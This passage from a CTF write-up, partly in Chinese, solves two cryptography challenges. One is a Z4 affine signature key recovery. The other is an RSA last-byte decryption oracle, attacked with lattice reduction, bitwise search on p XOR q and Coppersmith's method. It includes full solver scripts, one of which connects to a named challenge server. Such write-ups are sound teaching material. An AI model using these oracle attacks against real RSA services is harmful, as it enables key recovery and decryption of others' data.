            M_red[r*d:(r+1)*d, c_idx*d:(c_idx+1)*d] = R_blocks[blk_idx]

    # Calculate constant part of reduction
    sum_A_pow = sum(A_pows[:-1]) if L > 1 else np.zeros((d,d))
    c_red_base = mat_vec(sum_A_pow % 4, c)
    
    # 2. Expansion for g(u,v) = op(op(op(u,v),u),v)
    # g(u,v) = P*u + Q*v + r_g
    A2 = mat_mul(A, A)
    A3 = mat_mul(A2, A)
    P = (A3 + mat_mul(A, B)) % MOD
    Q = (mat_mul(A2, B) + B) % MOD
    r_g = mat_vec((A2 + A + np.eye(d, dtype=int)), c)

    # 3. Combine Reduction + g
    # A_final = (I kron P) * M_red
    # B_final = (I kron Q) * M_red
    
    # We can do this block-wise more efficiently than Kronecker product for huge matrices
    A_prime = np.zeros_like(M_red)
    B_prime = np.zeros_like(M_red)
    
    for i in range(L):
        # P and Q are d x d, applied to each d-row-block of M_red
        row_slice = slice(i*d, (i+1)*d)
        A_prime[row_slice, :] = mat_mul(P, M_red[row_slice, :])
        B_prime[row_slice, :] = mat_mul(Q, M_red[row_slice, :])

    # 4. Constant term
    # c_final = (P+Q)*c_red + r_g
    PQ = (P + Q) % MOD
    c_block = (mat_vec(PQ, c_red_base) + r_g) % MOD
    c_prime = np.tile(c_block, L)
    
    return A_prime, B_prime, c_prime

# ---------------------------------------------------
# Main Solver
# ---------------------------------------------------

def H(m: bytes):
    d = hashlib.shake_256(m).digest(96)
    b = np.frombuffer(d, dtype=np.uint8)
    return np.stack([b >> 4, b & 15], axis=1).reshape(2,6,16).astype(np.uint8)

def solve():
    print("[*] Initializing Z4 Affine Model...")
    model = Z4AffineModel(T)
    
    print("[*] Constructing hierarchical affine transformations...")
    # Layer 1: Block size 16
    Ab, Bb, cb = affine_transform_expansion(model.A0, model.B0, model.c0, 16)
    # Layer 2: Block size 6
    Av, Bv, cv = affine_transform_expansion(Ab, Bb, cb, 6)
    # Layer 3: Block size 2 (Final D function)
    AD, BD, cD = affine_transform_expansion(Av, Bv, cv, 2)
    
    print(f"    Final Matrix Size: {AD.shape}")

    # --- Data Loading (From Challenge) ---
    msg = b"Let's dance the waltz together"
    
    # Hardcoded instance data (Folded for brevity)
    sig_raw = [[[14, 8, 0, 5, 5, 1, 12, 12, 6, 10, 4, 7, 3, 10, 11, 1], [11, 14, 11, 12, 3, 8, 2, 3, 14, 13, 1, 5, 12, 10, 2, 12], [11, 0, 3, 11, 6, 14, 9, 10, 10, 15, 12, 2, 1, 1, 4, 7], [8, 1, 9, 9, 2, 10, 7, 2, 14, 13, 0, 7, 7, 14, 12, 2], [11, 4, 10, 1, 3, 15, 3, 2, 10, 0, 4, 7, 15, 4, 6, 10], [10, 10, 11, 6, 15, 10, 6, 12, 10, 12, 5, 13, 14, 6, 8, 10]], [[7, 9, 13, 11, 12, 14, 11, 10, 14, 8, 5, 4, 4, 8, 2, 3], [5, 15, 1, 10, 5, 15, 8, 7, 13, 8, 10, 5, 2, 0, 1, 9], [0, 3, 6, 1, 2, 14, 1, 1, 8, 15, 14, 0, 1, 6, 3, 12], [15, 8, 0, 10, 12, 13, 3, 5, 13, 9, 7, 13, 3, 3, 13, 14], [1, 6, 3, 14, 15, 12, 10, 0, 10, 15, 0, 0, 9, 3, 9, 2], [1, 9, 9, 4, 6, 8, 4, 8, 14, 14, 10, 3, 6, 4, 13, 14]]]
    c_raw = [[[12, 13, 11, 1, 5, 15, 5, 10, 5, 7, 4, 10, 7, 6, 6, 1], [3, 15, 1, 7, 11, 0, 1, 1, 12, 6, 3, 1, 5, 13, 0, 0], [4, 1, 7, 14, 3, 10, 14, 13, 13, 15, 11, 2, 8, 6, 3, 14], [15, 4, 3, 3, 6, 10, 14, 10, 7, 1, 10, 12, 1, 11, 6, 3], [1, 7, 11, 5, 7, 0, 6, 11, 14, 3, 5, 4, 4, 1, 5, 4], [4, 7, 9, 9, 13, 0, 14, 11, 8, 13, 15, 14, 12, 13, 15, 6]], [[2, 8, 6, 3, 13, 10, 2, 15, 3, 6, 13, 10, 3, 13, 6, 0], [4, 4, 10, 14, 8, 11, 15, 6, 2, 10, 14, 6, 2, 15, 9, 7], [13, 1, 10, 8, 8, 4, 9, 0, 3, 1, 9, 4, 11, 1, 12, 6], [8, 4, 2, 1, 14, 4, 1, 15, 14, 0, 15, 3, 1, 14, 0, 11], [13, 0, 12, 15, 10, 4, 7, 14, 1, 14, 14, 4, 5, 3, 14, 1], [13, 6, 5, 13, 5, 11, 5, 0, 15, 9, 0, 8, 7, 8, 4, 11]]]
    p1_raw = [[[13, 10, 9, 9, 10, 11, 8, 11, 14, 9, 15, 12, 10, 13, 15, 14], [13, 0, 8, 12, 11, 8, 8, 12, 0, 1, 3, 10, 4, 5, 5, 15], [7, 12, 0, 11, 1, 8, 6, 9, 3, 3, 14, 3, 7, 7, 0, 11], [3, 1, 3, 9, 9, 5, 3, 14, 5, 15, 13, 13, 12, 9, 3, 15], [0, 12, 0, 15, 9, 6, 14, 2, 6, 2, 9, 0, 7, 5, 5, 13], [3, 3, 3, 0, 1, 5, 9, 1, 1, 3, 0, 11, 5, 12, 3, 13]], [[3, 9, 13, 15, 10, 8, 6, 10, 1, 4, 10, 7, 5, 15, 5, 7], [6, 15, 14, 15, 2, 12, 14, 4, 2, 9, 2, 10, 13, 2, 14, 6], [11, 4, 4, 3, 11, 12, 15, 0, 12, 5, 13, 9, 5, 15, 14, 3], [13, 1, 15, 10, 4, 10, 0, 6, 3, 8, 6, 4, 1, 2, 4, 12], [5, 4, 5, 12, 1, 13, 14, 10, 10, 13, 2, 6, 13, 1, 11, 9], [13, 14, 13, 2, 14, 3, 2, 6, 4, 10, 13, 2, 14, 15, 0, 5]]]
    p2_raw = [[[0, 6, 0, 14, 5, 2, 5, 10, 7, 6, 12, 8, 4, 6, 11, 11], [14, 5, 6, 1, 3, 1, 12, 5, 10, 8, 1, 6, 13, 4, 0, 0], [0, 4, 4, 9, 13, 2, 0, 15, 2, 5, 3, 8, 6, 2, 14, 14], [9, 5, 8, 5, 1, 0, 1, 3, 8, 0, 5, 12, 4, 15, 4, 14], [6, 13, 0, 0, 2, 3, 4, 1, 5, 12, 15, 7, 10, 15, 1, 1], [0, 4, 0, 7, 4, 15, 2, 12, 9, 14, 1, 5, 14, 12, 3, 4]], [[2, 10, 15, 6, 13, 1, 11, 12, 11, 11, 6, 5, 9, 1, 15, 15], [10, 11, 6, 7, 14, 9, 7, 11, 6, 3, 10, 13, 14, 8, 10, 11], [9, 1, 0, 13, 4, 2, 6, 1, 7, 12, 10, 15, 14, 4, 4, 6], [3, 14, 0, 2, 1, 2, 0, 9, 3, 4, 1, 12, 6, 6, 3, 10], [1, 6, 7, 13, 12, 8, 1, 11, 5, 10, 15, 15, 0, 9, 10, 8], [3, 8, 6, 1, 0, 0, 3, 6, 1, 6, 5, 1, 13, 6, 10, 6]]]
    cipher = b'\x94\xbfp\xdd\x92\xda\x86\x87x\x18\x92\xa9\x80%\xa5\xe1\xb7\x13\x104U\xbe\xee\xf4\xfe\xdf\xa6\x1c[?\xde\x1ap\xd1\xa5\xe8A\xc7q\x89(\xd4\x9c;\xf5a\xce\x13T\x1a\xe6\x1b\xc4\x84\xf7z'
    
    # Encode knowns
    vec_c = model.encode(c_raw)
    vec_p1 = model.encode(p1_raw)
    vec_sig = model.encode(sig_raw)
    vec_h = model.encode(H(msg))

    print("[*] Solving linear systems over Z4...")
    # Equation 1: p1 = AD*c + BD*k + cD  =>  BD*k = p1 - AD*c - cD
    rhs_k = vec_sub(vec_sub(vec_p1, mat_vec(AD, vec_c)), cD)
    
    # Equation 2: sig = AD*h + BD*q + cD =>  BD*q = sig - AD*h - cD
    rhs_q = vec_sub(vec_sub(vec_sig, mat_vec(AD, vec_h)), cD)
    
    # Stack RHS to solve simultaneously: BD * [k | q] = [rhs_k | rhs_q]
    RHS = np.column_stack([rhs_k, rhs_q])
    
    solution = solve_linear_mod4(BD, RHS)
    
    vec_k_sol = solution[:, 0]
    vec_q_sol = solution[:, 1]
    
    print("[*] Reconstructing keys...")
    k_arr = model.decode(vec_k_sol, (2, 6, 16))
    q_arr = model.decode(vec_q_sol, (2, 6, 16))
    
    # Verification
    p2_check_vec = (mat_vec(AD, vec_k_sol) + mat_vec(BD, vec_q_sol) + cD) % 4
    p2_check = model.decode(p2_check_vec, (2, 6, 16))
    
    if np.array_equal(p2_check, np.array(p2_raw)):
        print("[+] Verification Successful: p2 matches.")
    else:
        print("[-] Warning: p2 mismatch! Key derivation might be wrong.")

    sk = {'c': np.array(c_raw, dtype=np.uint8), 'k': k_arr, 'q': q_arr}
    
    # Set numpy print options to match the challenge hash format
    np.set_printoptions(edgeitems=3, threshold=1000, linewidth=75, precision=8, suppress=False)
    key = hashlib.sha256(str(sk).encode()).digest()
    
    pt = AES.new(key, AES.MODE_CTR, nonce=b'Choreographer').decrypt(cipher)
    print(f"\n[+] Flag: {pt.decode(errors='ignore')}")

if __name__ == "__main__":
    solve()
```

![](/images/wp/unictf-wp/image-032.png)





### Subgroup-Inquisitor
```text
from Crypto.Util.number import *
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import random
from secret import flag

class RSA1:
    def __init__(self):
        while True:
            try:
                self.p = getPrime(1024)
                self.q = getPrime(1024)
                self.e = 65537
                self.n = self.p * self.q
                self.phi = (self.p - 1) * (self.q - 1)
                self.d = inverse(self.e , self.phi)
                self.cnt = 70
                self.ans = []
                self.A = []
                self.P = getPrime(1024)
                break
            except:
                continue

    def encrypt(self,m):
        m = bytes_to_long(m)
        return pow(m,self.e,self.n)

    def hint(self):
        if len(self.ans) <= 70:
            print("Give you my hint!!!")
            random.seed(114514)
            for i in range(len(self.ans)):
                self.A.append(random.getrandbits(1024))
            s = sum(self.ans[i] * self.A[i] for i in range(len(self.ans))) % self.P
            print("s = ", s)  
            print("P = ", self.P)  
        else:
            print("Wrong operation!!!")  

    def decrypt(self,c):
        m = pow(c,self.d,self.n)
        m = long_to_bytes(m)[-1]
        if self.cnt == 0:
            print("You don't have times!!!")
        else:
            self.ans.append(m)
            self.cnt -= 1

def challenge(flag):
    rsa=RSA1()
    public_key = RSA.construct((rsa.n , rsa.e))
    cipher = PKCS1_OAEP.new(public_key)
    m = cipher.encrypt(flag)
    hint = long_to_bytes(rsa.p ^ rsa.q)

    print("n = " , rsa.n)
    print("e = " , rsa.e)
    print("c = " , rsa.encrypt(m))
    print("hint = " , rsa.encrypt(hint))
    return rsa 



menu = '''  

--- Menu ---
[1] Input the ciphertext you want to decrypt!
[2] Get your data of this challenge!
[3] Get your own hint!
[4] Exit

Your Option > '''

if __name__ == '__main__':
    rsa = None
    while True:
        opt = input(menu)
        if int(opt) == 1:
            c = int(input("give me your cipher>>>"))
            if rsa == None:
                print("Please get your data first !!!")
            else :
                rsa.decrypt(c)
                print(f"There are {rsa.cnt} times left")
        if int(opt) == 2:
            print("good luck")
            rsa = challenge(flag)
        if int(opt) == 3:
            print("You can only have hint once")
            if rsa == None:
                print("Please get your data first !!!")
            else:
                rsa.hint()
                break
        if int(opt) == 4:
            print("exiting...")
            break
        else:
            continue
```

分析脚本

```text
self.p = getPrime(1024)  # 生成 1024位 素数 p
self.q = getPrime(1024)  # 生成 1024位 素数 q
self.n = self.p * self.q # 计算模数 N
self.e = 65537
# ...
self.cnt = 70            # 【关键】限制只能解密 70 次
```

+ **分析**：这是标准的 RSA 密钥生成。重点是它限制了 `cnt = 70`，这意味着我们只有 70 次与服务器交互的机会。

**2. 核心漏洞点：解密函数 **

```text
def decrypt(self, c):
    m = pow(c, self.d, self.n)      # 标准 RSA 解密：m = c^d mod n
    m = long_to_bytes(m)[-1]        # 【致命漏洞】只取明文的最后一个字节
    # ...
    self.ans.append(m)              # 记录下这个字节
    self.cnt -= 1                   # 次数 -1
```

+ **分析**：这是一个**Oracle（预言机）**。
    - 虽然它不给你完整的明文，但它告诉你**解密后明文的最低位字节（Last Byte）**。
    - 在密码学中，只要能泄露明文的最后一部分，配合 RSA 的数学特性，我们就可以还原出完整明文。

**3. 提示验证机制 **

```text
def hint(self):
    # ...
    s = sum(self.ans[i] * self.A[i] for i in range(len(self.ans))) % self.P
    print("s = ", s)
    print("P = ", self.P)
```

+ **分析**：这里是一个**背包问题/格（Lattice）问题**的变种。
    - S=∑(xi⋅Ai)(modP)
    - 题目本来是想让你通过 `decrypt` 拿到数据，如果网络不好或者没拿全，可以通过这个 `S` 和 `P` 利用 **LLL 算法** 把那 70 个字节算出来。在我们的 EXP 中，我们将利用这一步来**校验**网络获取的数据是否准确。

4. **题目目标 **

```text
m = cipher.encrypt(flag)            # 目标：Flag 被加密了
hint = long_to_bytes(rsa.p ^ rsa.q) # 关键：Hint 是 p XOR q
print("hint = " , rsa.encrypt(hint))
```

+ **分析**：
    - 我们要解密 Flag。
    - 但是我们没有私钥 d，无法直接解密。
    - 题目给了我们 Enc(p⊕q)。
    - **思路**：利用 70 次解密机会，还原出 p⊕q 的低位数据，



1**：利用 Oracle 剥洋葱 (LSB Oracle Attack)**

我们需要知道 $X = p \oplus q$ 的值。题目给了密文 $C_{hint} = (p \oplus q)^e \pmod N$。

RSA 有个乘法同态特性：$Enc(A) \cdot Enc(B) = Enc(A \cdot B) \pmod N$。

如果我们想知道明文 $M$ 的下一个字节是什么，我们可以构造一个新的密文，让明文右移 8 位（相当于除以 256）。

**攻击逻辑：**

1. 发送原始密文 $C_{hint}$ 给服务器。服务器解密，返回 $(p \oplus q)$ 的**最低字节**（第0个字节）。
2. 构造 $C_1 = C_{hint} \cdot (256^{-1})^e \pmod N$。
    - 这个密文对应明文是：$(p \oplus q) \cdot 256^{-1} \pmod N$。
    - 发送给服务器，服务器返回的就是 $p \oplus q$ 的**第1个字节**。
3. 构造 $C_2 = C_{hint} \cdot (256^{-2})^e \pmod N$。
    - 发送给服务器，得到**第2个字节**。
4. 重复 70 次，我们就能得到 $p \oplus q$ 的低 70 个字节（即 $70 \times 8 = 560$ bits）。

** 2：由 $p \oplus q$ 推出 $p$ (DFS 搜索)**

现在我们知道了 $N = p \cdot q$ 和 $X = p \oplus q$ 的低 560 位。

我们怎么把 $p$ 找出来？利用**按位爆破（DFS）**。

对于第 $k$ 个二进制位（从 0 到 560）：

+ 我们知道 $p$ 的第 $k$ 位 ($p_k$) 和 $q$ 的第 $k$ 位 ($q_k$) 的异或值必须等于 $X_k$。
+ 同时，$(p \times q)$ 在第 $k$ 位的结果必须等于 $N$ 的第 $k$ 位。

**逻辑推导：**

+ 如果 $X_k = 0$：那么 $(p_k, q_k)$ 只能是 $(0,0)$ 或者 $(1,1)$。
+ 如果 $X_k = 1$：那么 $(p_k, q_k)$ 只能是 $(0,1)$ 或者 $(1,0)$。
+ 我们每一层只有 2 种可能。我们把这两种可能代入计算 $p \times q$，看低位是否和 $N$ 吻合。吻合就继续下一位，不吻合就剪枝。

这样跑完 560 位，我们会得到大约 2000 个左右的**候选值 (Candidates)**，其中有一个肯定是真正的 $p$ 的低 560 位。

**步骤 3：Coppersmith 小根攻击** 

我们现在有了 $p$ 的低 560 位。

+ $p$ 总长 1024 位。
+ 已知位 $560$ 位。
+ $560 / 1024 \approx 0.54 > 0.5$。

**Coppersmith 定理**告诉我们：只要知道 $N$ 的因子 $p$ 超过一半的高位或低位，我们就能在多项式时间内算出完整的 $p$。

我们构造方程：

$f(x) = x \cdot 2^{560} + p_{known} \equiv 0 \pmod p$

这里的 $x$ 就是 $p$ 剩下的高位部分。使用 SageMath 的 `small_roots` 函数即可解出 $x$。

**exp**

```text
# -*- coding: utf-8 -*-
from pwn import *
from sage.all import *
import sys
import random
from Crypto.Util.number import long_to_bytes, inverse
from multiprocessing import Pool, cpu_count

# ================= 配置 =================
HOST = 'nc1.ctfplus.cn'
PORT = 18606
context.log_level = 'info'
sys.setrecursionlimit(10000)

# ================= 核心逻辑 (保留你的原版算法) =================

def get_data():
    print(f"[+] Connecting to {HOST}:{PORT}...")
    try:
        r = remote(HOST, PORT)
    except:
        print("[-] Connection failed.")
        sys.exit(1)
        
    # 1. 获取基础参数
    r.sendlineafter(b'Your Option >', b'2')
    r.recvuntil(b'n =  ')
    n = int(r.recvline())
    r.recvuntil(b'e =  ')
    e = int(r.recvline())
    r.recvuntil(b'c =  ')
    c_flag = int(r.recvline())
    r.recvuntil(b'hint =  ')
    c_hint = int(r.recvline())
    
    # 2. Oracle 交互 (跑满70次)
    print("[*] Retrieving Oracle Data (70 bytes)...")
    inv_256 = inverse(256, n)
    inv_256_e = pow(inv_256, e, n)
    curr = 1
    
    # 这里不需要保存返回值，只需要让服务器把字节存进 ans 数组
    for i in range(70):
        if i % 10 == 0: print(f"    Processing {i}/70...")
        payload = (c_hint * curr) % n
        r.sendlineafter(b'Your Option >', b'1')
        r.sendlineafter(b'give me your cipher>>>', str(payload).encode())
        r.recvuntil(b'times left')
        curr = (curr * inv_256_e) % n
        
    # 3. 获取 Lattice 校验数据
    r.sendlineafter(b'Your Option >', b'3')
    r.recvuntil(b's =  ')
    s = int(r.recvline())
    r.recvuntil(b'P =  ')
    p = int(r.recvline())
    r.close()
    return n, e, c_flag, c_hint, s, p

def solve_lattice(S, P):
    # 完全保留你的 Lattice 逻辑
    print("[*] Solving Lattice...")
    random.seed(int(114514))
    A = [random.getrandbits(1024) for _ in range(70)]
    
    offset = 128
    target = (S - offset * sum(A)) % P
    
    # 构造矩阵
    M = Matrix(ZZ, 72, 72)
    W = 2**1024
    for i in range(70):
        M[i, i] = 1
        M[i, 70] = W * A[i]
    M[70, 70] = W * P
    M[71, 70] = -W * target
    M[71, 71] = 1
    
    L = M.LLL()
    for row in L:
        s = 0
        if row[71] == 1: s = 1
        elif row[71] == -1: s = -1
        if s != 0 and row[70] == 0:
            res = [int(row[i])*s + 128 for i in range(70)]
            if sum(res[i]*A[i] for i in range(70)) % P == S:
                print("[+] Lattice Verified.")
                return res
    print("[-] Lattice failed.")
    sys.exit(1)

def recover_p_all_branches_unlimited(N, p_xor_q_int, limit_bits):
    # 完全保留你的 DFS 逻辑
    solutions = []
    stack = [(0, 0, 0)]
    
    while stack:
        idx, p_val, q_val = stack.pop()
        
        if idx == limit_bits:
            solutions.append(p_val)
            continue

        k_bit = (p_xor_q_int >> idx) & 1
        candidates = [(0,0), (1,1)] if k_bit == 0 else [(0,1), (1,0)]
        
        for pb, qb in candidates:
            mask = (1 << (idx + 1)) - 1
            next_p = p_val | (pb << idx)
            next_q = q_val | (qb << idx)
            
            if (next_p * next_q) & mask == (N & mask):
                stack.append((idx + 1, next_p, next_q))
    return solutions

# --- 多进程任务函数 (必须放顶层) ---
def check_candidate(args):
    cand, n, bits_known, x_bound = args
    try:
        # 重新构造 Ring
        P_ring = PolynomialRing(Zmod(n), name='x')
        x = P_ring.gen()
        f = x * (2**bits_known) + cand
        f = f.monic()
        # 使用你优化过的参数
        roots = f.small_roots(X=x_bound, beta=0.5, epsilon=0.022)
        if roots:
            return int(roots[0])
    except:
        pass
    return None

# ================= 主程序 =================
if __name__ == '__main__':
    # 1. 获取数据
    n, e, c, hint, s, p_mod = get_data()
    
    # 2. 解 Lattice
    rec_bytes = solve_lattice(s, p_mod)

    # 3. 核心计算 (恢复你的原版 LSB Oracle 公式)
    length = 70
    bits = length * 8
    
    print(f"[*] Calculating P^Q using LSB Oracle formula ({bits} bits)...")
    
    # 【重点】这里用回你的公式，这才是对的
    n_inv = inverse(n % 256, 256)
    k_sum = sum(((-b * n_inv) % 256) * (256**i) for i, b in enumerate(rec_bytes[:length]))
    p_xor_q = (-n * k_sum) % (256**length)

    # 4. 爆破 P 的低位
    print(f"[*] Finding candidates for P_low...")
    candidates = recover_p_all_branches_unlimited(n, p_xor_q, bits)
    print(f"[+] Found {len(candidates)} candidates.")
    
    if not candidates:
        print("[-] No candidates found. (Check algorithm or connection unstable)")
        sys.exit(1)

    # 5. 多进程 Coppersmith
    print(f"[*] Starting MULTIPROCESSING with {cpu_count()} cores...")
    X_BOUND = 2**(1024 - bits)
    tasks = [(cand, n, bits, X_BOUND) for cand in candidates]

    with Pool(processes=cpu_count()) as pool:
        for i, result in enumerate(pool.imap_unordered(check_candidate, tasks)):
            if i % 10 == 0:
                sys.stdout.write(f"\r[*] Checked {i}/{len(candidates)}...")
                sys.stdout.flush()
            
            if result is not None:
                p_high = result
                print(f"\n\n[!] BINGO! Found P_high: {p_high}")
                
                # 倒推正确的 P (因为多进程是乱序的)
                for cand in candidates:
                    p = p_high * (2**bits) + cand
                    if n % p == 0:
                        print("[+] Factorization Confirmed!")
                        q = n // p
                        
                        # 解密
                        phi = (p-1)*(q-1)
                        d = inverse(e, phi)
                        m_int = pow(c, d, n)
                        
                        # 尝试提取 Flag
                        try:
                            from Crypto.Cipher import PKCS1_OAEP
                            from Crypto.PublicKey import RSA
                            key = RSA.construct((int(n), int(e), int(d)))
                            cipher = PKCS1_OAEP.new(key)
                            flag_bytes = cipher.decrypt(long_to_bytes(m_int))
                            print("\n" + "#"*60)
                            print(f"FLAG: {flag_bytes.decode(errors='ignore')}")
                            print("#"*60 + "\n")
                        except:
                            print(f"\n[!] Raw Decrypted: {long_to_bytes(m_int)}")
                        
                        pool.terminate()
                        sys.exit(0)
                        
    print("\n[-] Attack finished. No flag found.")
```

![](/images/wp/unictf-wp/image-033.png)
